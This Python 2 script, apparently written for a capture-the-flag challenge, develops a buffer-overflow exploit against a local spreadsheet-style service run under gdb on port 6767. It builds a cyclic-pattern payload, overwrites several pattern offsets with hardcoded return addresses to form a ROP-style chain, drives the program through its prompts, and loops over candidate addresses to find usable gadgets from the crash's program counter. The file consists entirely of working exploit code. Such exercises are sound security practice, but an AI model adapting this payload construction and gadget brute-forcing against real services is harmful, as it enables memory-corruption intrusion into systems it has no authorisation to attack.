from pwnlib import *


def hax(addr):
	name = bytearray(pattern(0x500))
	name = name.replace(pq(0x6161686161676161), pq(0x401add))
	name = name.replace(pq(0x4461614361614261), pq(0x401a31))
	name = name.replace(pq(0x6159616158616157), pq(0x401add))
	name = name.replace(pq(0x61615f61612a6161), pq(addr))
	name = name.replace(pq(0x6e62616d62616c62), pq(0x401add))
	name = name.replace(pq(0x6149626148626147), pq(0x401a31))
	name = name.replace(pq(0x6261336261326261), pq(0x401a31))
	name = name.replace(pq(0x5d62615b62617d62), pq(0x401a8f))

	if "\n" in name:
		return None

	s = Socket(("localhost", 6767))

	s.ru("ne.\n(gdb) ")

	s.send("set *(char *)0x401a48 = 0xcc\n")
	s.ru("gdb")

	s.send("r\n")

	s.ru("he sheet:\n")
	s.send("%s\n" % name)
	s.ru("\n> ")
	s.send("w 0 + 8 9\n")
	s.ru("\n> ")
	s.send("r 0\n")
	s.ru("17\n\n> ")
	s.send("w 9 =0\n")

	s.ru("cells.\n\n> ")
	s.send("r 0\n")

	s.ru("(gdb) ")
	s.send("p $pc\n")

	result = s.ru("(gdb) ")
	s.send("k\nq\n")
	return result


address = 0x400be0

while True:
	print hex(address)
	result =  hax(address)

	if result is not None and "uw_frame_state_for+459" not in result and "__GI_raise+56" not in result:
		print result

	address += 5

